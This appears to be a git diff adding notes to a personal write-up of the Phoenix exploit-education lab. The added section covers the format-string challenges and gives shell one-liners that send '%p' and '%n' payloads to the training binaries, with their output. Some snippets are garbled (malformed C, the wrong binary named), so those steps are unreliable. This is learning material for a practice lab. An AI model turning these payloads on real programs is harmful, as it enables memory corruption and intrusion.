@@ -2,6 +2,9 @@
 
 # Note: challenges are located in /opt/phoenix/amd64
 
+# All stack Challenges:
+
+---
 
 ## Stack0:
 - gets take un check data which could be used to create the buffer over flow:
@@ -175,4 +178,60 @@ To run the code:
 ```
 (python payload.py; cat) | /opt/phoenix/amd64/stack-five
 ```
+
+
+
+---
+
+# Format string Challenges:
+
+
+## Format-Zero:
+
+- The format string vulnerability occurs when output is directly passed to the prinf() or sprintf() like:
+
+	```
+	char[100] name;
+	scanf(name);
+	printf(name);
+	```
+	
+- Here in the printf function the type is not specified before the name user can pass it on type as %x, %n, %i, %p etc.
+
+- which will pop of the data from the stack and show it on the screen:
+
+	```
+	user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%p' * 3" | ./format-zero 
+	Welcome to phoenix/format-zero, brought to you by https://exploit.education
+	Well done, the 'changeme' variable has been changed!
+	
+	```
+- Here I have provided three %p pointer types it will go into stack and print the values stored at 0, 1 and 2 on the screen, as shown.
+
+
+## Format-One:
+
+- In the next challenge we will pop of four values and then change the last one with the provided address in the little endian format:
+
+	```
+	user@phoenix-amd64:/opt/phoenix/amd64$ python -c "print '%p' * 4 + '\x6c\x4f\x76\x45'" | ./format-zero 
+	Welcome to phoenix/format-zero, brought to you by https://exploit.education
+	Well done, the 'changeme' variable has been changed!
+
+	```
+
+
+## Format-Two:
+
+- To solve this we have find the address of **changeme** variables address from the **32 bit** binary located in **i486** directory.
+- use the objdump or gdb to get the address rest is similar pop off the data from the stack until it reaches and changes the changemes value:
+
+	```
+	user@phoenix-amd64:/opt/phoenix/i486$ ./format-two $'\x68\x98\x04\x08%x %x %x %x %x %x %x %x %x %x %x %n \n'
+	Welcome to phoenix/format-two, brought to you by https://exploit.education
+	hffffd7d3 100 0 f7f84b67 ffffd610 ffffd5f8 80485a0 ffffd4f0 ffffd7d3 100 3e8  
+	Well done, the 'changeme' variable has been changed correctly!
+
+	```
+
 
